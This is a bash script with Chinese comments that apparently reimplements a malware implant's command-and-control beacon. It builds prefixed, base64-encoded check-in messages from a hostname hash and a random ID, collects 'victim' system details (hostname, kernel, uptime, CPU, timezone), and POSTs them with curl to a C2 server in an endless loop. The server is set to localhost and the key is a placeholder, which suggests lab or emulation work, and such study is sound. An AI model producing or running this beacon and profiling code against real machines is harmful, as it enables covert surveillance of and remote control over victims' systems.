#!/bin/bash

# 固定前綴和狀態標識
declare -A PREFIXES=(
    ["init"]="SIGNBTLG"          # Initial connection
    ["key_update"]="SIGNBTKE"    # Key update and profiling request
    ["command_request"]="SIGNBTGC"   # Ask for commands
    ["operation_failed"]="SIGNBTFI"  # Operation failed
    ["operation_success"]="SIGNBTSR" # Operation success
)

# 獲取主機名稱並生成部分 MD5 hash
get_md5_of_hostname() {
    hostname=$(hostname)
    md5_hash=$(echo -n "$hostname" | md5sum | head -c 16)  # 取前8字节（16字符的MD5）
    echo "$md5_hash"
}

# 隨機生成 8 bytes 的識別碼
generate_random_id() {
    head -c 8 /dev/urandom | xxd -p  # 使用 urandom 生成隨機值
}

# 構建 24 bytes 資訊
construct_message() {
    prefix=$1
    prefix_bytes=$(echo -n "$prefix")
    md5_hash_part=$(get_md5_of_hostname)
    random_id=$(generate_random_id)
    message="${prefix_bytes}${md5_hash_part}${random_id}"
    echo "$message"
}

# 與 C2 伺服器進行通訊
communicate_with_c2() {
    c2_url=$1
    prefix=$2

    # 構建訊息
    message=$(construct_message "$prefix")
    
    # 將訊息進行 base64 編碼
    data_to_send=$(echo -n "$message" | base64)

    # 隨機生成 3-7 個參數
    random_params=$(shuf -i 1000-9999 -n $(shuf -i 3-7 -n 1) | tr '\n' '|')
    random_params=${random_params%?}  # 移除最後的 `|`
    
    # 發送 POST 請求
    payload="${data_to_send}|${random_params}"
    response=$(curl -s -X POST -d "$payload" "${c2_url}/receive_data")
    
    echo "$response"
}

# 獲取 victim 的基本資訊
getinfo() {
    computer_name=$(hostname)
    product_name=$(uname -n)
    os_details=$(uname -a)
    system_uptime=$(awk '{print int($1)}' /proc/uptime)
    cpu_info=$(lscpu | grep "Model name" | cut -d ':' -f2 | xargs)
    system_locale="zh-TW"
    timezone=$(date +"%Z")
    network_status="Connected"

    echo "{\"computer_name\": \"$computer_name\", \"product_name\": \"$product_name\", \"os_details\": \"$os_details\", \"system_uptime\": \"$system_uptime\", \"cpu_info\": \"$cpu_info\", \"system_locale\": \"$system_locale\", \"timezone\": \"$timezone\", \"network_status\": \"$network_status\"}"
}

# 發送 victim 資訊到 C2 server
send_victim_info() {
    c2_url=$1
    info=$2
    response=$(curl -s -X POST -H "Content-Type: application/json" -d "$info" "${c2_url}/send_info")
    echo "$response"
}

# 主循環
main() {
    c2_url="http://localhost:5000"
    
    while true; do
        # 發送初始連接請求
        echo "Sending initial connection message..."
        response=$(communicate_with_c2 "$c2_url" "${PREFIXES['init']}")
        echo "Response: $response"

        # 可以在這裡解析 response，判斷是否成功
        # 範例中假設 success，然後繼續執行
        aes_key="dummy_key"  # 假設這裡成功拿到 AES key
        
        # 發送更新金鑰的請求
        echo "Sending key update request..."
        response=$(communicate_with_c2 "$c2_url" "${PREFIXES['key_update']}")
        echo "Response: $response"

        # 獲取 victim 資訊並發送
        echo "Sending victim info..."
        victim_info=$(getinfo)
        send_info_response=$(send_victim_info "$c2_url" "$victim_info")
        echo "Response: $send_info_response"
        
        sleep 5  # 等待一段時間再執行下一次
    done
}

main
